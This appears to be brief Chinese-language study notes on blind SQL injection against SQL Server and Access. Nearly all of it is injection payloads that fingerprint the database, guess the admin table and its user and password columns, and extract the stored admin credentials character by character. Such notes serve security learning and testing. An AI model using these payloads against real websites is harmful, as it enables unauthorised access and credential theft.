# sqlserver
## 注入点寻找，判断和access一样
## 配置文件
`<%` \
`set conn =server.createobject("adodb.connection")` \
`conn.open "provider=sqloledb;source=local;uid=sa;pwd=*****;database-name"` \
`%>`
## 判断数据库
mssql数据库 \
`and 1=(select count(*) from sysobjects)>0` \
access数据库 \
`and 1=(select count(*) from msysobjects)>0` \
## 猜表名
`and 1=(select count(*) from admin)` \
`and 1=(select count(*) from login)`
## 猜列名
`and 1=(select count(user) from admin)` \
`and 1=(select count(password) from admin)`
## 猜第一个user的长度
`and 1=(select top 1 len(user) from admin)` \
`and 1=(select top 1 len(password) from admin)`
## 猜ascii值，再转成字符
第一个user的第一个字符的ascii \
`and 1=(select top 1 asc(mid(user,1,1)) from admin)>96` \
第一个user的第二个字符的ascii \
`and 1=(select top 1 asc(mid(user,2,1)) from admin)>55` \
第一个user对应的密码的第一个字符 \
`and 1=(select top 1 asc(mid(password,1,1)) from admin)>100` 
